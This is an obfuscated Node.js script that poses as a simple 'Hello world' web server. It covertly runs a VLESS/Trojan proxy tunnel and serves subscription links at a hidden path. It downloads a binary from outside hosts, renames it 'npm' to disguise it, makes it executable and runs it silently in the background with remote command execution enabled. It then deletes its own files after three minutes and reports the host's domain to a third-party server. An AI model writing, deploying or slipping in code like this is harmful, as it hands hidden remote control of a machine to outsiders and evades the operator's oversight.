const _0x2842b7=_0x1090;(function(_0x2ffb9b,_0x14798d){const _0x59034c=_0x1090,_0x3edad0=_0x2ffb9b();while(!![]){try{const _0x4d8ea5=-parseInt(_0x59034c(0x97))/0x1+-parseInt(_0x59034c(0x103))/0x2+parseInt(_0x59034c(0xd7))/0x3*(-parseInt(_0x59034c(0xe7))/0x4)+parseInt(_0x59034c(0xc4))/0x5*(-parseInt(_0x59034c(0xc3))/0x6)+-parseInt(_0x59034c(0xdb))/0x7*(-parseInt(_0x59034c(0xef))/0x8)+-parseInt(_0x59034c(0xec))/0x9+parseInt(_0x59034c(0xb6))/0xa;if(_0x4d8ea5===_0x14798d)break;else _0x3edad0['push'](_0x3edad0['shift']());}catch(_0x509708){_0x3edad0['push'](_0x3edad0['shift']());}}}(_0x5b5b,0xc24e0));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x2842b7(0xab)),net=require(_0x2842b7(0xc0)),path=require('path'),crypto=require(_0x2842b7(0x104)),{Buffer}=require(_0x2842b7(0xcf)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2842b7(0xd9)][_0x2842b7(0xdd)]||_0x2842b7(0x9a),NEZHA_SERVER=process['env'][_0x2842b7(0xd4)]||'',NEZHA_PORT=process['env'][_0x2842b7(0xe2)]||'',NEZHA_KEY=process['env'][_0x2842b7(0xfe)]||'',DOMAIN=process[_0x2842b7(0xd9)]['DOMAIN']||_0x2842b7(0xd8),AUTO_ACCESS=process[_0x2842b7(0xd9)]['AUTO_ACCESS']||!![],WSPATH=process[_0x2842b7(0xd9)][_0x2842b7(0xf5)]||UUID[_0x2842b7(0xb1)](0x0,0x8),SUB_PATH=process[_0x2842b7(0xd9)][_0x2842b7(0xda)]||_0x2842b7(0xce),NAME=process[_0x2842b7(0xd9)][_0x2842b7(0xe1)]||_0x2842b7(0xc1),PORT=process[_0x2842b7(0xd9)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x63ff09=_0x2842b7;try{const _0x5c55af=await axios[_0x63ff09(0xc2)]('https://speed.cloudflare.com/meta'),_0x59f339=_0x5c55af[_0x63ff09(0xca)];ISP=(_0x59f339[_0x63ff09(0xea)]+'-'+_0x59f339['asOrganization'])[_0x63ff09(0x94)](/ /g,'_');}catch(_0x4813ee){ISP=_0x63ff09(0x9b);}};GetISP();function _0x5b5b(){const _0x42d00b=['once','&fp=chrome&type=ws&host=','every','axios','send','https://amd64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','hex','slice','&path=%2F','\x20with\x20all\x20DNS\x20servers','https://oooo.serv00.net/add-url','trojan://','36802620YujbZj','npm','text/html','--tls','setsid\x20nohup\x20./npm\x20-s\x20','join','text/plain','connection','stream','trim','net','Hug','get','6FBioEF','20215nZzWzQ','npm\x20download\x20successfully','2053','arch','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','error','data','arm64','https://amd64.ssss.nyc.mn/v1','Answer','sub','buffer','find','chmod\x20+x\x20npm','createServer','end','NEZHA_SERVER','client_secret:\x20','write','3JFVuem','1234.abc.com','env','SUB_PATH','141659rhVoVN','writeHead','UUID','readUInt8','2096','config.yaml','NAME','NEZHA_PORT','Status','2087','https://','createWriteStream','5740648mgedSr','npm\x20is\x20already\x20running,\x20skip\x20running...','8443','country','createHash','589500WDmbPH','pop','concat','184qKvYoB','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','Not\x20Found\x0a',':443?encryption=none&security=tls&sni=','url','npm\x20running\x20error:','WSPATH','includes','split','\x20-p\x20','type','length','update','log','toString','NEZHA_KEY','true','Server','finish','pipe','2106794ilIonl','crypto','listen','aarch64','substr','utf-8','replace','sha224','index.html','791739jZHxJt','false','catch','5efabea4-f6d4-91fd-b8f0-27e004c89c60','Unknown',':443?security=tls&sni=','https://arm64.ssss.nyc.mn/v1','Hello\x20world!','Automatic\x20Access\x20Task\x20added\x20successfully','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','post','readUInt16BE','base64','2083','map','then','Server\x20is\x20running\x20on\x20port\x20'];_0x5b5b=function(){return _0x42d00b;};return _0x5b5b();}const httpServer=http[_0x2842b7(0xd2)]((_0x57ce62,_0x32a62b)=>{const _0x554d6e=_0x2842b7;if(_0x57ce62[_0x554d6e(0xf3)]==='/'){const _0x2b9a5c=path['join'](__dirname,_0x554d6e(0x96));fs['readFile'](_0x2b9a5c,'utf8',(_0x2107a9,_0x120a88)=>{const _0x5c3a6a=_0x554d6e;if(_0x2107a9){_0x32a62b[_0x5c3a6a(0xdc)](0xc8,{'Content-Type':_0x5c3a6a(0xb8)}),_0x32a62b[_0x5c3a6a(0xd3)](_0x5c3a6a(0x9e));return;}_0x32a62b[_0x5c3a6a(0xdc)](0xc8,{'Content-Type':_0x5c3a6a(0xb8)}),_0x32a62b[_0x5c3a6a(0xd3)](_0x120a88);});return;}else{if(_0x57ce62[_0x554d6e(0xf3)]==='/'+SUB_PATH){const _0x128872='vless://'+UUID+'@'+DOMAIN+_0x554d6e(0xf2)+DOMAIN+_0x554d6e(0xa9)+DOMAIN+_0x554d6e(0xb2)+WSPATH+'#'+NAME+'-'+ISP,_0x5dd297=_0x554d6e(0xb5)+UUID+'@'+DOMAIN+_0x554d6e(0x9c)+DOMAIN+_0x554d6e(0xa9)+DOMAIN+_0x554d6e(0xb2)+WSPATH+'#'+NAME+'-'+ISP,_0x50f727=_0x128872+'\x0a'+_0x5dd297,_0x1091b7=Buffer[_0x554d6e(0xaf)](_0x50f727)['toString'](_0x554d6e(0xa3));_0x32a62b[_0x554d6e(0xdc)](0xc8,{'Content-Type':'text/plain'}),_0x32a62b[_0x554d6e(0xd3)](_0x1091b7+'\x0a');}else _0x32a62b[_0x554d6e(0xdc)](0x194,{'Content-Type':_0x554d6e(0xbc)}),_0x32a62b['end'](_0x554d6e(0xf1));}}),wss=new WebSocket[(_0x2842b7(0x100))]({'server':httpServer}),uuid=UUID[_0x2842b7(0x94)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x4832af){return new Promise((_0x1f759a,_0xd2b87b)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x4832af)){_0x1f759a(_0x4832af);return;}let _0x415223=0x0;function _0x44959a(){const _0x28b70e=_0x1090;if(_0x415223>=DNS_SERVERS['length']){_0xd2b87b(new Error('Failed\x20to\x20resolve\x20'+_0x4832af+_0x28b70e(0xb3)));return;}const _0x56c654=DNS_SERVERS[_0x415223];_0x415223++;const _0x198f73='https://dns.google/resolve?name='+encodeURIComponent(_0x4832af)+'&type=A';axios[_0x28b70e(0xc2)](_0x198f73,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x28b70e(0xa6)](_0x5138d5=>{const _0x32c55c=_0x28b70e,_0x1c0572=_0x5138d5[_0x32c55c(0xca)];if(_0x1c0572[_0x32c55c(0xe3)]===0x0&&_0x1c0572[_0x32c55c(0xcd)]&&_0x1c0572[_0x32c55c(0xcd)][_0x32c55c(0xfa)]>0x0){const _0x502d57=_0x1c0572[_0x32c55c(0xcd)][_0x32c55c(0xd0)](_0x305f0f=>_0x305f0f[_0x32c55c(0xf9)]===0x1);if(_0x502d57){_0x1f759a(_0x502d57[_0x32c55c(0xca)]);return;}}_0x44959a();})[_0x28b70e(0x99)](_0x13baf6=>{_0x44959a();});}_0x44959a();});}function handleVlessConnection(_0xcdb8c9,_0x5d04c1){const _0x2e65b6=_0x2842b7,[_0x21cd01]=_0x5d04c1,_0x4cb9db=_0x5d04c1['slice'](0x1,0x11);if(!_0x4cb9db[_0x2e65b6(0xaa)]((_0x591dee,_0x11eb12)=>_0x591dee==parseInt(uuid['substr'](_0x11eb12*0x2,0x2),0x10)))return![];let _0x34000d=_0x5d04c1[_0x2e65b6(0xb1)](0x11,0x12)[_0x2e65b6(0xde)]()+0x13;const _0x17e164=_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d,_0x34000d+=0x2)[_0x2e65b6(0xa2)](0x0),_0x1c9204=_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d,_0x34000d+=0x1)[_0x2e65b6(0xde)](),_0x149b92=_0x1c9204==0x1?_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d,_0x34000d+=0x4)[_0x2e65b6(0xbb)]('.'):_0x1c9204==0x2?new TextDecoder()['decode'](_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d+0x1,_0x34000d+=0x1+_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d,_0x34000d+0x1)[_0x2e65b6(0xde)]())):_0x1c9204==0x3?_0x5d04c1[_0x2e65b6(0xb1)](_0x34000d,_0x34000d+=0x10)['reduce']((_0x24f939,_0x144bd7,_0xbd2469,_0x1f592d)=>_0xbd2469%0x2?_0x24f939[_0x2e65b6(0xee)](_0x1f592d[_0x2e65b6(0xb1)](_0xbd2469-0x1,_0xbd2469+0x1)):_0x24f939,[])[_0x2e65b6(0xa5)](_0x739cf5=>_0x739cf5[_0x2e65b6(0xa2)](0x0)[_0x2e65b6(0xfd)](0x10))[_0x2e65b6(0xbb)](':'):'';_0xcdb8c9[_0x2e65b6(0xac)](new Uint8Array([_0x21cd01,0x0]));const _0x3685d7=createWebSocketStream(_0xcdb8c9);return resolveHost(_0x149b92)[_0x2e65b6(0xa6)](_0x39a1a9=>{const _0x4a6bda=_0x2e65b6;net['connect']({'host':_0x39a1a9,'port':_0x17e164},function(){const _0x18f83c=_0x1090;this[_0x18f83c(0xd6)](_0x5d04c1[_0x18f83c(0xb1)](_0x34000d)),_0x3685d7['on']('error',()=>{})[_0x18f83c(0x102)](this)['on'](_0x18f83c(0xc9),()=>{})['pipe'](_0x3685d7);})['on'](_0x4a6bda(0xc9),()=>{});})['catch'](_0x4fc4c0=>{const _0x437566=_0x2e65b6;net['connect']({'host':_0x149b92,'port':_0x17e164},function(){const _0x562892=_0x1090;this[_0x562892(0xd6)](_0x5d04c1['slice'](_0x34000d)),_0x3685d7['on'](_0x562892(0xc9),()=>{})[_0x562892(0x102)](this)['on'](_0x562892(0xc9),()=>{})[_0x562892(0x102)](_0x3685d7);})['on'](_0x437566(0xc9),()=>{});}),!![];}function handleTrojanConnection(_0x58af4d,_0x3747ba){const _0x22609f=_0x2842b7;try{if(_0x3747ba[_0x22609f(0xfa)]<0x3a)return![];const _0x5774a8=_0x3747ba['slice'](0x0,0x38)[_0x22609f(0xfd)](),_0x25fa63=[UUID];let _0x396173=null;for(const _0x19b91a of _0x25fa63){const _0xf1cc6e=crypto[_0x22609f(0xeb)](_0x22609f(0x95))[_0x22609f(0xfb)](_0x19b91a)['digest'](_0x22609f(0xb0));if(_0xf1cc6e===_0x5774a8){_0x396173=_0x19b91a;break;}}if(!_0x396173)return![];let _0x401d3c=0x38;_0x3747ba[_0x401d3c]===0xd&&_0x3747ba[_0x401d3c+0x1]===0xa&&(_0x401d3c+=0x2);const _0x4f6dd4=_0x3747ba[_0x401d3c];if(_0x4f6dd4!==0x1)return![];_0x401d3c+=0x1;const _0x50a4c5=_0x3747ba[_0x401d3c];_0x401d3c+=0x1;let _0x1e762b,_0x2fed99;if(_0x50a4c5===0x1)_0x1e762b=_0x3747ba[_0x22609f(0xb1)](_0x401d3c,_0x401d3c+0x4)[_0x22609f(0xbb)]('.'),_0x401d3c+=0x4;else{if(_0x50a4c5===0x3){const _0xe6727c=_0x3747ba[_0x401d3c];_0x401d3c+=0x1,_0x1e762b=_0x3747ba[_0x22609f(0xb1)](_0x401d3c,_0x401d3c+_0xe6727c)[_0x22609f(0xfd)](),_0x401d3c+=_0xe6727c;}else{if(_0x50a4c5===0x4)_0x1e762b=_0x3747ba[_0x22609f(0xb1)](_0x401d3c,_0x401d3c+0x10)['reduce']((_0x185d69,_0x22d4f1,_0x2f9589,_0xc127b1)=>_0x2f9589%0x2?_0x185d69[_0x22609f(0xee)](_0xc127b1[_0x22609f(0xb1)](_0x2f9589-0x1,_0x2f9589+0x1)):_0x185d69,[])[_0x22609f(0xa5)](_0x830811=>_0x830811['readUInt16BE'](0x0)['toString'](0x10))[_0x22609f(0xbb)](':'),_0x401d3c+=0x10;else return![];}}_0x2fed99=_0x3747ba[_0x22609f(0xa2)](_0x401d3c),_0x401d3c+=0x2;_0x401d3c<_0x3747ba[_0x22609f(0xfa)]&&_0x3747ba[_0x401d3c]===0xd&&_0x3747ba[_0x401d3c+0x1]===0xa&&(_0x401d3c+=0x2);const _0x1d8738=createWebSocketStream(_0x58af4d);return resolveHost(_0x1e762b)[_0x22609f(0xa6)](_0x531f11=>{net['connect']({'host':_0x531f11,'port':_0x2fed99},function(){const _0x410aed=_0x1090;_0x401d3c<_0x3747ba[_0x410aed(0xfa)]&&this[_0x410aed(0xd6)](_0x3747ba['slice'](_0x401d3c)),_0x1d8738['on'](_0x410aed(0xc9),()=>{})[_0x410aed(0x102)](this)['on'](_0x410aed(0xc9),()=>{})[_0x410aed(0x102)](_0x1d8738);})['on']('error',()=>{});})[_0x22609f(0x99)](_0x398393=>{const _0x174bec=_0x22609f;net['connect']({'host':_0x1e762b,'port':_0x2fed99},function(){const _0x14d252=_0x1090;_0x401d3c<_0x3747ba[_0x14d252(0xfa)]&&this[_0x14d252(0xd6)](_0x3747ba[_0x14d252(0xb1)](_0x401d3c)),_0x1d8738['on'](_0x14d252(0xc9),()=>{})[_0x14d252(0x102)](this)['on']('error',()=>{})['pipe'](_0x1d8738);})['on'](_0x174bec(0xc9),()=>{});}),!![];}catch(_0x10371c){return![];}}wss['on'](_0x2842b7(0xbd),(_0x2faaad,_0x12f252)=>{const _0x4b3424=_0x2842b7,_0x2cb3c=_0x12f252['url']||'';_0x2faaad[_0x4b3424(0xa8)]('message',_0x266df9=>{const _0x25c48a=_0x4b3424;if(_0x266df9['length']>0x11&&_0x266df9[0x0]===0x0){const _0x5d22c9=_0x266df9[_0x25c48a(0xb1)](0x1,0x11),_0x382530=_0x5d22c9[_0x25c48a(0xaa)]((_0x539c3d,_0x4b4d18)=>_0x539c3d==parseInt(uuid[_0x25c48a(0x107)](_0x4b4d18*0x2,0x2),0x10));if(_0x382530){!handleVlessConnection(_0x2faaad,_0x266df9)&&_0x2faaad['close']();return;}}!handleTrojanConnection(_0x2faaad,_0x266df9)&&_0x2faaad['close']();})['on'](_0x4b3424(0xc9),()=>{});});const getDownloadUrl=()=>{const _0x122b0d=_0x2842b7,_0x50f1b9=os[_0x122b0d(0xc7)]();return _0x50f1b9==='arm'||_0x50f1b9===_0x122b0d(0xcb)||_0x50f1b9===_0x122b0d(0x106)?!NEZHA_PORT?_0x122b0d(0x9d):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x122b0d(0xcc):_0x122b0d(0xad);},downloadFile=async()=>{const _0x8dc249=_0x2842b7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x32ac1f=getDownloadUrl(),_0x3e7c9a=await axios({'method':'get','url':_0x32ac1f,'responseType':_0x8dc249(0xbe)}),_0x59fa6f=fs[_0x8dc249(0xe6)](_0x8dc249(0xb7));return _0x3e7c9a['data'][_0x8dc249(0x102)](_0x59fa6f),new Promise((_0x58f98a,_0x1e4388)=>{const _0x4ab59d=_0x8dc249;_0x59fa6f['on'](_0x4ab59d(0x101),()=>{const _0x25ab96=_0x4ab59d;console[_0x25ab96(0xfc)](_0x25ab96(0xc5)),exec(_0x25ab96(0xd1),_0x4caf1e=>{if(_0x4caf1e)_0x1e4388(_0x4caf1e);_0x58f98a();});}),_0x59fa6f['on'](_0x4ab59d(0xc9),_0x1e4388);});}catch(_0x228575){throw _0x228575;}},runnz=async()=>{const _0x543bd5=_0x2842b7;try{const _0x12a034=execSync(_0x543bd5(0xa0),{'encoding':_0x543bd5(0x108)});if(_0x12a034[_0x543bd5(0xbf)]()!==''){console[_0x543bd5(0xfc)](_0x543bd5(0xe8));return;}}catch(_0x46730f){}await downloadFile();let _0x559616='',_0x6e5c30=['443',_0x543bd5(0xe9),_0x543bd5(0xdf),_0x543bd5(0xe4),_0x543bd5(0xa4),_0x543bd5(0xc6)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x17f85b=_0x6e5c30[_0x543bd5(0xf6)](NEZHA_PORT)?_0x543bd5(0xb9):'';_0x559616=_0x543bd5(0xba)+NEZHA_SERVER+':'+NEZHA_PORT+_0x543bd5(0xf8)+NEZHA_KEY+'\x20'+_0x17f85b+_0x543bd5(0xae);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x33eca6=NEZHA_SERVER[_0x543bd5(0xf6)](':')?NEZHA_SERVER[_0x543bd5(0xf7)](':')[_0x543bd5(0xed)]():'',_0xbb978e=_0x6e5c30[_0x543bd5(0xf6)](_0x33eca6)?_0x543bd5(0xff):_0x543bd5(0x98),_0x413fa4=_0x543bd5(0xd5)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xbb978e+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x543bd5(0xe0),_0x413fa4);}_0x559616=_0x543bd5(0xf0);}else{console[_0x543bd5(0xfc)](_0x543bd5(0xc8));return;}}try{exec(_0x559616,{'shell':'/bin/bash'},_0x270968=>{const _0x340ec3=_0x543bd5;if(_0x270968)console[_0x340ec3(0xc9)](_0x340ec3(0xf4),_0x270968);else console[_0x340ec3(0xfc)]('npm\x20is\x20running');});}catch(_0x59eba0){console[_0x543bd5(0xc9)]('error:\x20'+_0x59eba0);}};function _0x1090(_0x388bc6,_0x4c385f){_0x388bc6=_0x388bc6-0x94;const _0x5b5b03=_0x5b5b();let _0x109010=_0x5b5b03[_0x388bc6];return _0x109010;}async function addAccessTask(){const _0x14db1a=_0x2842b7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5dd26a=_0x14db1a(0xe5)+DOMAIN;try{const _0x4cde5d=await axios[_0x14db1a(0xa1)](_0x14db1a(0xb4),{'url':_0x5dd26a},{'headers':{'Content-Type':'application/json'}});console[_0x14db1a(0xfc)](_0x14db1a(0x9f));}catch(_0x472cb0){}}const delFiles=()=>{const _0x33ffc4=_0x2842b7;fs['unlink'](_0x33ffc4(0xb7),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x2842b7(0x105)](PORT,()=>{const _0x5b811f=_0x2842b7;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5b811f(0xfc)](_0x5b811f(0xa7)+PORT);});
